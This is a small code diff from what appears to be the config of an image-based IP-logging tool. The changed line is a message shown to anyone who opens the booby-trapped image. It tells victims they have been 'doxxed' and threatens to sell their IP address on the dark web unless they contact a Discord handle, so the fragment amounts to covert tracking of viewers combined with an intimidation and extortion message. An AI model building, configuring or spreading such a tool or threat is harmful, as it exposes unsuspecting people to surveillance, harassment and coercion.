@@ -29,7 +29,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "YOU HAVE BEEN DOXXED BY OGMEMPHIS ADD THIS DISCORD IF YOU DONT WANT YOUR IP TO BE SOLD ON THE DARKWEB @gher2!", # Message to show
+        "message": "YOU HAVE BEEN DOXXED BY OGMEMPHIS ADD THIS DISCORD IF YOU DONT WANT YOUR IP TO BE SOLD ON THE DARKWEB @gher2", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
